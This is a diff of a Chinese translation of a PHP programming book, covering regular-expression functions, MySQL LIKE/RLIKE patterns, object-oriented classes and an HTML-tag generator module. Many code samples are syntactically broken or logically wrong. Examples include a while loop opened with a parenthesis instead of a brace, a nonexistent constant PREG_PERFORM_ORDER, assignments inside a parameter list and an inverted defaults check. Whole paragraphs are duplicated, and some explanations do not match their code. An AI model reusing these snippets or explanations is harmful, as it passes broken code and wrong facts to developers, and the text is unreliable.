 
 ```php
+
 // 使用临时变量持有参数化字符串。该变量将存储替换后的最终结果。
+
 $result = $target;
+
 ```
 
 ```php
+
 // 遍历参数列表。
+
 while (list($key, $value) = each($matches[1])) (
+
 ```
 
 ```php
+
 // 对于每个参数，用替换数组中的相应
+
 // 值进行替换。
+
 $result = preg_replace(
+
     "[/\$value]",
+
     $replacement[$value],
+
     $result
+
 );
+
 ```
 
 ```php
+
 // 显示一些调试信息。
+
 echo "$key, $value, $result<br>";
+
 )
+
 ```
 
 为了给字符串添加后缀，可以这样操作：
 
 ```php
+
 $target = 'Happy Times';
+
 $pattern = '/\s*(\w+)\s+(\w+)$/';
+
 $replacement = '$2 $1';
+
 $result = preg_replace($pattern, $replacement, $target);
+
 ```
 
-替换语句使用 \1 和 \2 来反转两个单词。你可以使用类似的技术处理列信息。
+替换语句使用 `\1` 和 `\2` 来反转两个单词。你可以使用类似的技术处理列信息。
 
 为了给字符串添加前缀，可以这样操作：
 
 ```php
+
 $target = 'Happy Times';
+
 $pattern = '/^(.*)/';
+
 $replacement = 'The';
+
 $result = preg_replace($pattern, $replacement, $target);
+
 ```
 
-当替换完成后，$prefix 变量的值被添加到文本开头。这是通过括号子模式完成的。
+当替换完成后，`$prefix` 变量的值被添加到文本开头。这是通过括号子模式完成的。
 
 为了给字符串添加后缀，可以这样操作：
 
 ```php
+
 $target = 'Happy Times';
+
 $pattern = '/(.*)$/';
+
 $replacement = ' Again';
+
 $result = preg_replace($pattern, $replacement, $target);
+
 ```
 
-当替换完成后，$suffix 变量的值被添加到文本末尾。这是通过括号子模式完成的。
+当替换完成后，`$suffix` 变量的值被添加到文本末尾。这是通过括号子模式完成的。
 
-替换语句使用 \1 和 \2 来反转两个单词。你可以使用类似的技术处理列信息。
+替换语句使用 `\1` 和 `\2` 来反转两个单词。你可以使用类似的技术处理列信息。
 
 为了反转两个单词，可以这样操作：
 
-替换语句使用 \1 和 \2 来使用 \2 $1。
+替换语句使用 `\1` 和 `\2` 来使用 `\2 $1`。
 
 为了反转两个单词，可以这样操作：
 
 ```php
+
 $target = 'Happy Times';
+
 $pattern = '/\s*(\w+)\s+(\w+)$/';
+
 $replacement = '$2 $1';
+
 $result = preg_replace($pattern, $replacement, $target);
+
 ```
 
 ## 这段代码显示
@@ -6663,43 +7470,56 @@ $result = preg_replace($pattern, $replacement, $target);
 
 这段代码的输出显示了所采取的中间步骤。首先，将 honorific 参数替换为 Mr.，然后将 last_name 参数替换为 Jones。
 
-
-
-
-
 将字符串拆分为字符，请执行以下操作：
 
 ```
+
 $target = "A Jolly Giant Jumped";
+
 $pattern = "./";
+
 preg_match_all(
+
 $pattern,
+
 $target,
+
 $matches,
+
 PREG_PERFORM_ORDER
+
 );
+
 ```
 
-执行这些语句后， $matches[0] 包含一个数组，其元素是目标字符串的字符。
+执行这些语句后， `$matches[0]` 包含一个数组，其元素是目标字符串的字符。
 
 要根据分隔符字符序列将字符串拆分为字段，请执行以下操作：
 
 ```
+
 $target = "Harry:Male:134:41";
+
 $pattern = "/:/";
+
 $result = preg_split($pattern, $target);
-```
-
-执行这些语句后， $result 数组拥有如你预期的四个条目。然而，如果目标字符串中缺少某个字段，就会发生某些情况。如果 $target 是：
 
 ```
+
+执行这些语句后， `$result` 数组拥有如你预期的四个条目。然而，如果目标字符串中缺少某个字段，就会发生某些情况。如果 `$target` 是：
+
+```
+
 $target = "Harry:Male::41";
-```
-
-$result 数组只有两个条目——前两个字段。这意味着，目标字符串中不存在的字段必须至少有一个空格字符作为占位符。如果你不在乎不存在的字段，可以使用如下模式：
 
 ```
+
+`$result` 数组只有两个条目——前两个字段。这意味着，目标字符串中不存在的字段必须至少有一个空格字符作为占位符。如果你不在乎不存在的字段，可以使用如下模式：
+
+```
+
 $pattern = "/:+";
+
 ```
 
 # MySQL
@@ -6716,28 +7536,43 @@ LIKE 运算符执行简单的模式匹配。它只理解两个元字符：
 使用 LIKE 运算符非常直观，特别是与你之前在本章中读到的 Perl 风格模式相比。接下来的示例匹配所有以“r”开头的文本：
 
 ```
+
 SELECT
+
 FROM
+
 table
+
 WHERE UPPER(field) LIKE 'R%'
+
 ```
 
 如果你需要匹配特定数量的字符，下划线元字符将很有用。下一个示例匹配以“1”开头且长度为三个字符的字段。换句话说，从 101 到 199 的数字。
 
 ```
+
 SELECT
+
 FROM
+
 table
+
 WHERE field LIKE '1__'
+
 ```
 
 通常使用 \ 字符来转义需要其原始含义的元字符。然而，SQL 提供了 ESCAPE 关键字来为其语句增加灵活性。例如，此示例了如何使用感叹号作为转义字符。
 
 ```
+
 SELECT
+
 FROM
+
 table
+
 WHERE field LIKE '\autoexec.bat' ESCAPE '!'
+
 ```
 
 尽管模式中没有使用 % 和 _ 字符，但 ESCAPE 关键字仍然有用，可以避免使用反斜杠。
@@ -6745,9 +7580,13 @@ WHERE field LIKE '\autoexec.bat' ESCAPE '!'
 NOT 运算符允许 SQL 匹配模式的反面。使用 WHERE 子句：
 
 ```sql
+
 WHERE
+
 field NOT LIKE '1_'
+
 ```
+
 匹配除 101 到 199 数字之外的所有值。
 
 ## RLIKE
@@ -6755,12 +7594,19 @@ field NOT LIKE '1_'
 RLIKE（或 regexp）运算符允许你在 SQL 语句中使用更复杂的模式。本章中“正则表达式定义”部分中的所有信息都适用于 RLIKE 可用的模式。由于我们已经看了很多模式示例，我在这里只提供一个。接下来的示例仅选择那些指定字段不包含有效电话号码的记录：
 
 ```
+
 SELECT
+
 *
+
 FROM
+
 table
+
 WHERE
+
 field NOT RLIKE '[0-9](3)[0-9](3)[0-9](4)'
+
 ```
 
 > 在 SQL 语句中添加 RLIKE 运算符几乎肯定会增加它们的处理时间。
@@ -6773,13 +7619,9 @@ field NOT RLIKE '[0-9](3)[0-9](3)[0-9](4)'
 
 你学习了模式可以包含原子、分支和括号表达式。原子是需要匹配的单个项目。原子后面可以跟 *, +, ? 或界符以形成片段。界符允许你按精确的次数匹配原子。在匹配两个或多个片段时，使用交替元字符 `|`。括号表达式匹配一个字符，但允许你指定多种可能性。[abc] 匹配任何单个 a、b 或 c。字符类（例如 POSIX 的 `[:space:]` 类）匹配所有类型的字符。`[:upper:]` 类匹配所有大写字母。表 9.2 是最基本的元字符的列表。
 
-PHP POSIX 风格函数在模式匹配方面做得足够。。 和 eregi 都用于基础文本搜索。ereg_replace 和 eregi_replace 用于替换匹配的文本。eregi 函数不区分大小写。最后一个函数 split 根据指定的分隔符将文本拆分为组件。
+PHP POSIX 风格函数在模式匹配方面做得足够。ereg 和 eregi 都用于基础文本搜索。ereg_replace 和 eregi_replace 用于替换匹配的文本。eregi 函数不区分大小写。最后一个函数 split 根据指定的分隔符将文本拆分为组件。
 
 Perl 风格函数在模式匹配方面表现良好。ereg 和 eregi 都用于基础文本搜索。ereg_replace 和 eregi_replace 用于替换匹配的文本。eregi 函数不区分大小写。最后一个函数 split 根据指定的分隔符将文本拆分为组件。
-
-
-
-
 
 ## 学习类
 
@@ -6851,7 +7693,9 @@ Perl 风格函数在模式匹配方面表现良好。ereg 和 eregi 都用于基
 到目前为止，你学习的是抽象术语中的抽象。现在让我们使用之前创建的 `pen` 类来看一个抽象的具体示例。`pen` 类只有一个它自己的属性（其他都是继承的）。为了辩论起见，墨水颜色可以是“蓝色”、“黑色”或“红色”。当创建一个钢笔对象时（目前创建机制并不那么好玩），它会被分配一个特定的颜色。让我们暂时用“蓝色”作为例子。这里有一行创建对象的代码：
 
 ```
+
 $pen = new cls_pen("blue");
+
 ```
 
 现在钢笔对象已经创建了。你会在意墨水颜色的内部格式是字符串 “blue” 还是数字 1 吗？如果因为你预计要使用数百万个对象，内部格式从字符串更改为数字以节省计算机内存呢？只要接口不改变，使用该类的程序就不需要更改。
@@ -6884,14 +7728,22 @@ $pen = new cls_pen("blue");
 父类
 
 ```
+
 | cls_inventory_item |
+
 | part_number |
+
 | qty_on_hand |
-| 子类 | 子类 |
+
+| 子类名: |
 | cls_pen | | cls_pencil |
+
 | -子类-| cls_four_color | -子类-| cls_thick_lead |
+
 | | |
+
 | -子类-| cls_mechanical |
+
 ```
 
 **图 10.5 具有三层的层级结构。**
@@ -6902,37 +7754,48 @@ $pen = new cls_pen("blue");
 
 封装的一个大优势是它让为了非预期目的使用信息变得困难，从而减少了逻辑错误。例如，如果钢笔是以 100 支为批出售的，`change_qty_on_hand` 函数可以反映这一点。不允许只更改 1 支。这种对业务规则的强制是面向对象编程最大的吸引力之一。
 
-
-
-
-
 # 对象与 PHP
 
 掌握了本章前半部分讨论的 OOP 术语后，你已经准备好查看库存类是如何定义的了：
 
 ```php
+
 // 开始类定义。
+
 class cls_inventory_item {
+
     // 声明一个用于存储属性值的数组。
+
     var $props;
 
     // 定义一个构造函数。
+
     function cls_inventory_item(
+
         $this->props['part_num'] = '',
+
         $this->props['qty_on_hand'] = ''
+
     ) {}
+
 }
 
 // 创建一个新对象。
+
 $item = new cls_inventory_item();
+
 ```
 
 **class** 关键字开始定义。语法如下：
 
 ```php
+
 class class_name {
+
     // php 语句
+
 }
+
 ```
 
 在 **class** 关键字之后，$props` 变量声明应该始终放在方法声明之前。这个变量变成了对象的核心——一个包含对象所有属性的数组。使用数组来存储属性可以让你创建处理对象属性的函数，而无需担心存在多少属性或它们是什么类型。例如，你可能想写一个验证布尔属性的函数。如果所有布尔属性的条目都以 "bln" 开头，那么对 `$prop` 数组进行带有正则表达式 `"bln.+\"` 和 `if` 语句的简单循环就能为完成该任务提供工具。
@@ -6944,29 +7807,43 @@ PHP 提供了一个名为 `$this` 的特殊变量，以便你从当前对象内�
 除了每个对象都存在的变量外，`$this` 在数据类型上也是特殊的。它是一个引用，而不是标量或数组变量。引用变量使用 `->` 符号（更多信息请参阅本章稍后的“指针的值就是我的数据”部分）。例如，下行代码访问了类的 `$props` 数组：
 
 ```php
+
 $this->props['part_num'] = '';
+
 ```
 
 除了特殊的 `$this->` 之外，指定数组元素是标准的 PHP 语法。你可以利用 PHP 在类构造函数中定义默认值的能力。例如：
 
 ```php
+
 function cls_inventory_item(
+
   $part_num = 'Unknown',
+
   $qty_on_hand = '0'
+
 ) {
+
   $this->props['part_num'] = $part_num;
+
   $this->props['qty_on_hand'] = $qty_on_hand;
+
 }
+
 ```
 
 为了创建一个具有不同属性的对象，请使用 `new` 关键字并在构造调用中添加参数：
 
 ```php
+
 // 创建一个数量为 10 的项目
+
 $item1 = new cls_inventory_item("ID1233", "10");
 
 // 创建一个数量为 23 的项目
+
 $item2 = new cls_inventory_item("ID7053", "23");
+
 ```
 
 ## 使用命名参数
@@ -6974,12 +7851,19 @@ $item2 = new cls_inventory_item("ID7053", "23");
 程序员命名参数的概念很快被程序员们迅速接受了。我在为 Microsoft Word 编写脚本语言时首次接触到它。命名参数涉及向函数传递单个数组，而不是单个参数：
 
 ```php
+
 $item = new cls_inventory_item(
+
   array(
+
     "part_num" => "ID2312",
+
     "qty_on_hand" => "10"
+
   )
+
 );
+
 ```
 
 许多程序员喜欢这种技术，因为对于每个参数：
@@ -6991,10 +7875,15 @@ $item = new cls_inventory_item(
 `cls_inventory_item` 函数需要更新以理解参数数组：
 
 ```php
+
 function cls_inventory_item($in_props) {
+
   $this->props['part_num'] = $in_props['part_num'];
+
   $this->props['qty_on_hand'] = $in_props['qty_on_hand'];
+
 }
+
 ```
 
 这个构造函数简单地将 `$in_props`（input properties 的缩写）数组中的条目复制到类的 `$props` 数组中。你能想到一种更优雅的复制技术吗？如果类需要一个新属性会发生什么？
@@ -7002,63 +7891,101 @@ function cls_inventory_item($in_props) {
 而不是为每个属性添加一行
 
 ```php
+
 $this->props[property_name] = $in_props[property_name];
+
 ```
 
 代码，可以使用 `while` 循环来执行此任务：
 
 ```php
+
 function cls_inventory_item($in_props) {
+
   while (list($key, $value) = each($in_props)) {
+
     $this->props[$key] = $value;
+
   }
+
 }
+
 ```
 
-你可能已经发现这发现了一种避免产生 Bug 的方法。除了特殊的 `$this->` 之外，指定数组元素是标准的 PHP 语法。你可以利用 PHP 定义默认值的能力。第一步是创建一个默认值数组：
+你可能已经发现这发现了一种避免产生 Bug 的方法。除了特殊的 `$this->` 之外，指定数元素是标准的 PHP 语法。你可以利用 PHP 定义默认值的能力。第一步是创建一个默认值数组：
 
 ```php
+
 var $defaults = array(
+
   'part_num' => '',
+
   'qty_on_hand' => '0'
+
 );
+
 ```
 
 第二步是这样修改构造函数：
 
 ```php
+
 function cls_inventory_item($in_props) {
+
   while (list($key, $value) = each($in_props)) {
+
     if (isset($defaults[$key])) {
+
       $this->props[$key] = $value;
+
     } else {
+
       $this->props[$key] = $defaults[$key];
+
     }
+
   }
+
 }
+
 ```
 
 你可能已经发现这发现了一种避免产生 Bug 的方法。除了特殊的 `$this->` 之外，指定数组元素是标准的 PHP 语法。你可以利用 PHP 定义默认值的能力。第一步是创建一个默认值数组：
 
 ```php
+
 var $defaults = array(
+
   'part_num' => '',
+
   'qty_on_hand' => '0'
+
 );
+
 ```
 
 第二步是这样修改构造函数：
 
 ```php
+
 function cls_inventory_item($in_props) {
+
   while (list($key, $value) = each($in_props)) {
+
     if (isset($defaults[$key])) {
+
       $this->props[$key] = $value;
+
     } else {
+
       $this->props[$key] = $defaults[$key];
+
     }
+
   }
+
 }
+
 ```
 
 ## 访问属性
@@ -7066,46 +7993,69 @@ function cls_inventory_item($in_props) {
 抽象的的概念是代码不应该知道类内部细节。那么如何访问数据呢？通过使用访问函数，可以执行两种基本操作：
 
 ```php
+
 function get_color() {
+
   return $this->props['color'];
+
 }
 
 function set_color($value) {
+
   $this->props['color'] = $value;
+
 }
+
 ```
 
 这些函数是这样用的：
 
 ```php
+
 $item = new cls_inventory_item(
+
   array(
+
     "part_num" => "ID2312",
+
     "qty_on_hand" => "10"
+
   )
+
 );
 
 $item->set_color("blue");
+
 echo $item->get_color();
+
 ```
 
 另一种方案是使用通用函数来设置和获取：
 
 ```php
+
 function get($property) {
+
   return $this->props[$property];
+
 }
 
 function set($property, $value) {
+
   $this->props[$property] = $value;
+
 }
+
 ```
 
 这些函数是这样用的：
 
 ```php
+
 $item->set('color', 'blue');
+
 echo $item->get('color');
+
 ```
 
 这种方法起初是个好主意，特别是你你需要在父类中定义这两个函数。然而，深思之后显示了一些潜在问题：
@@ -7116,18 +8066,18 @@ echo $item->get('color');
 然而，最重要的原因是消除 Bug 的来源。在输入属性名称时非常很容易出错。当使用通用访问函数时，PHP 无法捕获这种错误，一个非常微妙且难以发现的 Bug 会感染你的程序。例如，下行代码是错误的：
 
 ```php
+
 $item->set('ink_clr', 'green');
+
 ```
 
 如果你在特定的访问函数上犯了同样的输入错误，PHP 引擎会报告错误，因为找不到 set_ink_colr 函数：
 
 ```php
+
 $item->set('ink_colr('green'); <- 运行时错误！
+
 ```
-
-
-
-
 
 # 对象与 PHP
 
@@ -7135,23 +8085,35 @@ $item->set('ink_colr('green'); <- 运行时错误！
 多态（Polymorphism）虽然听起来是个大词，但它的概念非常简单。它意味着在基类中定义的方法会重写父类中定义的方法。下面的示例阐明了这一概念。假设你有两个类，A 和 B，且 B 是 A 的子类。如果在 B 类中没有找到某个函数，PHP 将在 A 类中查找该函数。以下是说明这一原理的代码：
 
 ```php
+
 class A {
+
     function A() {
+
     }
 
     function dspTwo() {
+
         echo "A: Two<br>";
+
     }
+
 }
 
 class B extends A {
+
     function B() {
+
         $this->A();
+
     }
+
 }
 
 $object = new B();
+
 $object->dspTwo();
+
 ```
 
 这段代码显示为：
@@ -7160,27 +8122,41 @@ A: Two
 > 因为显示了 A: Two 文本，显然调用的是 A 类中的 dspTwo 函数。如果你在 B 类内部创建了第二个 dspTwo 函数，PHP 将会调用该函数：
 
 ```php
+
 class A {
+
     function A() {
+
     }
 
     function dspTwo() {
+
         echo "A: Two<br>";
+
     }
+
 }
 
 class B extends A {
+
     function B() {
+
         $this->A();
+
     }
+
 }
 
 function dspTwo() {
+
     echo "B: Two<br>";
+
 }
 
 $object = new B();
+
 $object->dspTwo();
+
 ```
 
 这段代码显示为：
@@ -7194,70 +8170,119 @@ B: Two
 ## 列表 10.1 cls_ink_color.inc—声明 ink_color 类
 
 ```php
+
 <?php cls_ink_color.inc
 
 class cls_ink_color {
+
     var $props;
 
     var $defaults = array(
+
         'color' => ''
+
     );
 
     // 限制有效颜色的数量
+
     // 以对颜色设置
+
     // 进行验证。
+
     var $valid_colors = array(
+
         'blue',
+
         'brown',
+
         'green'
+
     );
 
     var $default_color = 'UNKNOWN';
 
     // 类构造函数。由于只有一个
+
     // 参数，因此不需要具名参数。
+
     function cls_ink_color($color) {
+
         if (!$this->set_color($color)) {
+
             apply_error_exit('CLS_INK_COLOR: Bad Color!');
+
         }
+
     }
+
 }
 
 // 遍历有效颜色列表
+
 //
+
 // 将每个颜色与请求的颜色进行比较。
+
 // 如果请求的颜色有效则返回 true
+
 // 否则返回 false。
+
 function validate_color($color) {
+
     while (
+
         list($key, $value) = each($this->valid_colors)
+
     ) {
+
         if (preg_match("/$value/i", $color)) {
+
             return(1);
+
         }
+
     }
+
     return(0);
+
 }
 
 // 用于设置颜色值的访问器函数。
+
 // 如果未找到请求的颜色，则使用
+
 // 值并返回 false。
+
 function set_color($color) {
+
     if ($this->validate_color($color)) {
+
         // 所有颜色值都以大写存储
+
         // 以保持数据一致性。
+
         $this->props['color'] = strtoupper($color);
+
         return(1);
+
     } else {
+
         $this->props['color'] = $this->default_color;
+
         return(false);
+
     }
+
 }
 
 // 获取颜色值的访问器函数。
+
 function get_color() {
+
     return $this->props['color'];
+
 }
+
 ```
 
 
@@ -7280,23 +8305,37 @@ PHP（或任何 Web 脚本语言）的一个不太优雅方面是 HTML 与脚本
 我不羞于承认，首先、最后、可能永远我都是程序员。我以语句和 `for` 循环的方式思考。因此，当我被迫从正在使用的任何编程语言跳出 HTML 标签时，这种过渡会有些别扭。对我来说，一眼理解以下内容要得多：
 
 ```php
+
 <?php
+
 echo '<table border="0">';
+
 for ($index = 0; $index < 10; $index++) {
+
     echo '<tr><td>Cell ' . $index . '</td></tr>';
+
 }
+
 echo '</table>';
+
 ?>
+
 ```
 
 而不是像这样：
 
 ```html
+
 <table border="0">
+
 <?php for ($index = 0; $index < 10; $index++) { ?>
+
 <tr><td>Cell <?php echo $index; ?></td></tr>
+
 <?php }
+
 </table>
+
 ```
 
 你能分辨出 `<?php .. ?>` 配对吗？这种代码的调试和维护难度会有多大？
@@ -7311,7 +8350,7 @@ echo '</table>';
 
 ## 形成基类
 
-- 为 HTML 标签提供默认属性。HTML 的大部分内容涉及冗余信息——例如背景颜色和字体。
+- 为 HTML 标签提供默属性。HTML 的大部分内容涉及冗余信息——例如背景颜色和字体。
 - 使 Web 页面元素能够保存到数据库中。通过提供一个属性来缓存 HTML 元素（如选择框），在生成未来的 Web 页面时可以节省大量的处理时间。
 
 > 在继续之前，让我强调一下，所开发的模块并不是为具有大量访问者的生产环境设计的。该模块从未为了效率进行过压力测试。相反，它是作为一个“思想实验”开发的。尽管如此，我确实在我的网站中使用该模块。正如他们所说的，你的情况可能会不同。
@@ -7325,82 +8364,145 @@ echo '</table>';
 ## 列表 11.1 first.php3——支持 HTML 标签
 
 ```php
+
 <?php
+
 class cls_htmlbase {
+
     var $props;
+
 ```
 
 ```php
+
 var $defaults = array(
+
     'tag_name' => '',
+
     'bln_endtag' => '1',
+
     'attributes' => ''
+
 );
+
 ```
 
 ```php
+
 function __construct() {
+
     while (list($key, $value) = each($this->defaults)) {
+
         $this->props[$key] = $value;
+
     }
+
 }
+
 ```
 
 ```php
+
 function set_props($props) {
+
     while (list($key, $value) = each($props)) {
+
         $this->props[$key] = $value;
+
     }
+
 }
+
 ```
 
 ```php
+
 function get_prop($key) {
+
     return $this->props[$key];
+
 }
+
 ```
 
 ```php
+
 function generate($contents = '') {
+
     $tag_name = $this->get_prop('tag_name');
+
     $buffer = "<" . $tag_name;
+
     while (list($key, $value) = each($this->props)) {
+
         if ($key != 'tag_name') {
+
             $buffer .= " " . $key . '="' . $value . '"';
+
         }
+
     }
+
     $buffer .= ">" . $contents;
+
     if ($this->get_prop('bln_endtag') == '1') {
+
         $buffer .= "</" . $tag_name . ">";
+
     }
+
     return $buffer;
+
 }
+
 //
+
 ```
 
 ```php
+
 class cls_html extends cls_htmlbase {
+
     function __construct($props = array()) {
+
         parent::__construct();
+
         if (!empty($props)) {
+
             $this->set_props($props);
+
         }
+
     }
+
 }
+
 //
+
 ```
 
 ```php
+
 $html = new cls_html(array(
+
     'tag_name' => 'table',
+
     'border' => '0'
+
 ));
+
 echo $html->generate();
+
 for ($index = 0; $index < 10; $index++) {
+
     echo '<tr><td>Cell ' . $index . '</td></tr>';
+
 }
+
 echo $html->generate();
+
 //?>
+
 ```
 
 
@@ -7428,13 +8530,17 @@ echo $html->generate();
 代码列表 11.2 second.php—使用包含文件简化你的主脚本文件
 
 ```php
+
 <?php // second.php
 
 require("cls_htmlbase.inc");
+
 require("cls_html.inc");
 
 // 创建一个 html 对象。
+
 $html = new cls_html();
+
 ```
 
 ## 整合 generate 函数
@@ -7443,55 +8549,80 @@ $html = new cls_html();
 
 经验丰富的程序员已经注意到，`htmlbase` 和 `html` 类之间存在重复代码。`generate` 方法在两个类中都被定义。这利用了 PHP 可以调用被多态重写的方法这一事实。然而，通过增加一点复杂性，你可以避免冗余代码。
 
-技巧是在父类中将 `generate` 方法重命名为某个唯一名称，然后创建一个新的 `generate` 方法来调用该具有唯一名称的方法。子类可以根据需要调用该唯一名称的方法。如果子类没有显式定义 `generate` 方法，继承仍然有效，因为 `htmlbase` 仍然有一个 `generate` 方法。在查看列表 11.3 之后，这种相当令人困惑的技术将变得清晰。
+技巧是在父类中将 `generate` 方法重命名为某个唯一名称，然后创建一个新的 `generate` 方法来调用该具有唯一名称的方法。子类可以根据需要调用该具有唯一名称的方法。如果子类没有显式定义 `generate` 方法，继承仍然有效，因为 `htmlbase` 仍然有一个 `generate` 方法。在查看列表 11.3 之后，这种相当令人困惑的技术将变得清晰。
 
 **列表 11.3** *cls_htmlbase.inc—使用唯一名称的方法允许你调用被多态重写的父方法*
 
 ```php
+
 <?php // cls_htmlbase.inc
 
 class cls_htmlbase {
+
     ...
 
     // 这里是唯一名称的方法。
+
     // 只有名称变了，代码
+
     // 保持不变。
+
     function htmlbase_generate() {
+
         $tag_name = $this->props['tag_name'];
+
         $buffer = "<$tag_name>";
+
 ```
 
 ## 添加 Head 支持
 
 ```php
+
 // TODO: 将包含的元素添加到缓冲区。
 
 if ($this->props['_bln_endtag'] == '1') {
+
     $buffer .= "&lt;" . $this->props['tag_name'] . "&gt;";
+
 }
+
     return($buffer);
+
 }
 
 // 这是被子类
+
 // 重写的方法。它的唯一工作是调用
+
 // 唯一名称的方法。
+
 function generate() {
+
     return($this->htmlbase_generate());
+
 }
+
 ?>
+
 ```
 
 `html` 类现在可以更改为使用 `htmlbase_generate` 方法，以便代码可以重用。只需要更新 `cls_html::generate` 方法：
 
 ```php
+
 function generate() {
+
     $doctype = $this->props['doctype'];
 
     $buffer = "<!DOCTYPE $doctype>";
+
     $buffer .= $this->htmlbase_generate();
 
     return($buffer);
+
 }
+
 ```
 
 > 在本节中，我使用了类:方法的表示法来指示特定的类和方法。这种表示法在 OOP 世界中是标准的。
@@ -7507,35 +8638,53 @@ function generate() {
 `head` HTML 标签不接受属性，因此支持起来非常简单。列表 11.4 显示了 `cls_head.inc` 文件。
 
 ```php
+
 <?php // cls_head.inc
 
 class cls_head extends cls_htmlbase {
 
     function __construct($props = array()) {
+
         parent::__construct($props);
+
         $this->props['tag_name'] = 'head';
+
         $this->props['_bln_endtag'] = '0';
+
     }
 
     function generate() {
+
         $buffer = $this->htmlbase_generate();
-        
+
         foreach ($this->props as $key => $value) {
+
             if ($key != 'tag_name' && $key != '_bln_endtag' && $key != 'doctype') {
+
                 $buffer .= " " . $key . "=\"" . htmlspecialchars($value) . "\"";
+
             }
+
         }
-        
+
         if ($this->props['_bln_endtag'] == '1') {
+
             $buffer .= "</head>";
+
         } else {
+
             $buffer .= "</head>";
+
         }
-        
+
         return $buffer;
+
     }
+
 }
+
 ?>
+
 ```
 
 
@@ -7544,9 +8693,13 @@ class cls_head extends cls_htmlbase {
 ## 添加正体支持 269
 
 ```php
+
 $head = new cls_head(array(
+
   'bgcolor' => 'blue'
+
 ));
+
 ```
 
 使用数组通过命名参数传递属性可以提供了一定的灵活性。由于类已经有了处理命名参数的代码，因此只需要对“标准”类构造函数进行细小的修改。
@@ -7554,22 +8707,31 @@ $head = new cls_head(array(
 在处理 `htmlbase` 构造函数的更改之前，由于属性的验证非常重要，在 `body` 类中设置一个 `$valid_attributes` 数组是有意义的。由于 `$in_props` 参数被用于将属性传递到类构造函数中，这段代码不再有效：
 
 ```php
+
 $this->cls_htmlbase(array(
+
 'tag_name' => 'body'
+
 ));
+
 ```
 
 需要将参数数组传递给 `htmlbase` 类。
 
 ```php
+
 $this->cls_htmlbase($in_props);
+
 ```
 
 这个更改引起了一个小问题：如何将 `tag_name` 属性传递给 `htmlbase` 构造函数？答案是在调用 `htmlbase` 构造函数之前，将该属性添加到 `$in_props` 数组中：
 
 ```php
+
 $in_props['tag_name'] = 'body';
+
 $this->cls_htmlbase($in_props);
+
 ```
 
 整个 `body` 类可以在列表 11.6 中找到。
@@ -7577,26 +8739,45 @@ $this->cls_htmlbase($in_props);
 **列表 11.6** cls_body.inc——结合 HTML head 标签
 
 ```php
+
 <?php // cls_body.inc
 
 class cls_body extends cls_htmlbase {
+
   var $valid_attributes = array(
+
   'background',
+
   'bgcolor',
+
   'text',
+
   'link',
+
   'alink',
+
   'vlink',
+
   'leftmargin',
+
   'topmargin',
+
   'bgproperties'
+
 ););
+
 function cls_body($in_props = array()) {
+
   $in_props['tag_name'] = 'body';
+
   $this->cls_htmlbase($in_props);
+
 }
+
 }
+
 ?>
+
 ```
 
 ## 第 11 章 / 间三：创建一个 HTML 模块
@@ -7604,94 +8785,157 @@ function cls_body($in_props = array()) {
 现在我们可以再次处理 `htmlbase` 类了。需要更新构造函数：
 
 ```php
+
 function cls_htmlbase($in_props = array()) {
+
   while (list($key, $value) = each($this->defaults())) {
+
     $this->props[$key] = $value;
+
   }
+
   while (list($key, $value) = each($in_props)) {
+
     $this->props[$key] = $value;
+
   }
+
 }
+
 ```
 
 ```php
+
 // 获取属性数组的副本。在此时，
+
 // 它是空的。“良好的编码习惯”要求我们复制
+
 // 它而不是直接使用 array()，这样未来的更改
+
 // 就不可能破坏这段代码。
+
 $attributes = $this->props['attributes'];
+
 ```
 
 ```php
+
 // 重置输入属性数组。它在上面
+
 // 被用于设置类属性。
+
 reset($in_props);
+
 ```
 
 ```php
+
 // 遍历输入数组，寻找
+
 // 有效属性，当发现其中一个时，将其保存
+
 // 到属性属性的副本中。
+
 while (list($key, $value) = each($in_props)) {
+
   if ($this->validate_attribute_name($key)) {
+
     $attributes[$key] = $value;
+
   }
+
 }
+
 ```
 
 ```php
+
 // 将属性数组复制回类
+
 // 属性。
+
 $this->props['attributes'] = $attributes;
+
 ```
 
 更新后的构造函数引用了此处所示的 `validate_attribute_name` 方法：
 
 ```php
+
 function validate_attribute_name($name) {
+
     $attributes = $this->valid_attributes;
 
     // 如果正在构造的类没有
+
     // 有效属性，$attributes 变量
+
     // 不是一个数组（它可能是空的）。如果是
+
     // 这种情况，则不需要进行任何验证。
+
     if (is_array($attributes)) {
+
         while (list($key, $value) = each($attributes)) {
+
             if (preg_match("/^$value$/i", $name)) {
+
                 return(1);
+
             }
+
         }
+
     }
+
     return(0);
+
 }
+
 ```
 
 最后的更改是 `htmlbase::generate` 方法，以便属性整合到生成的 HTML 中：
 
 ```php
+
 function htmlbase_generate() {
+
     $tag_name = $this->props['tag_name'];
+
     $buffer = "$tag_name";
 
     // 将任何属性属性添加到起始标签。
+
     $attributes = $this->props['attributes'];
+
     while (list($key, $value) = each($attributes)) {
+
         $buffer .= " $key=$value";
+
     }
 
     $buffer .= ">";
 
     // 将包含元素添加到 buffer。
+
     $contents = $this->props['contents'];
+
     while (list($key, $value) = each($contents)) {
+
         $buffer .= $value->generate();
+
     }
 
     if ($this->props['tag_end'] == '') {
+
         $buffer .= "</$tag_name>";
+
     }
+
     return($buffer);
+
 }
+
 ```
 
 有了这个最后的更改，就可以创建 `fifth.php3` 来测试列表 11.7 所示的新类。
@@ -7699,54 +8943,83 @@ function htmlbase_generate() {
 **列表 11.7** fifth.php3——测试 HTML body 标签
 
 ```php
+
 <?php
+
 require("cls_base.inc");
+
 require("cls_html.inc");
+
 require("cls_head.inc");
+
 require("cls_body.inc");
 
 $html = new cls_html();
+
 $head = new cls_head();
 
 // 创建 body 对象。
+
 $body = new cls_body(array(
+
   'bgcolor' => 'blue'
+
 ));
 
 $html->add($head);
+
 $html->add($body);
 
 $buffer = htmlspecialchars($html->generate());
+
 echo $buffer;
+
 ```
 
 此脚本显示：
 
 ```html
+
 <!DOCTYPE PUBLIC "-//W3C//DTD HTML 3.2//EN">
+
 <html>
+
 <head></head>
+
 <body bgcolor="blue"></body>
+
 </html>
+
 ```
 
  浏览器会将输出显示在一行。在这里我将 HTML 分成了几行以便提高可读性。验证代码是否有效是一个好主意。让我们尝试创建一个坏属性的 body 标签：
 
 ```php
+
 $body = new cls_body(array(
+
   'bgcolor' => 'blue',
+
   'bad_attribute' => 'green'
+
 ));
+
 ```
 
 使用这段代码创建 body 标签的结果是：
 
 ```html
+
 <!DOCTYPE PUBLIC "-//W3C//DTD HTML 3.2//EN">
+
 <html>
+
 <head></head>
+
 <body bgcolor="blue"></body>
+
 </html>
+
 ```
 
 注意坏属性被忽略了。在你自己的脚本中，你可能认为坏属性应该得到错误或消息。你处理错误的方式取决于应用程序。
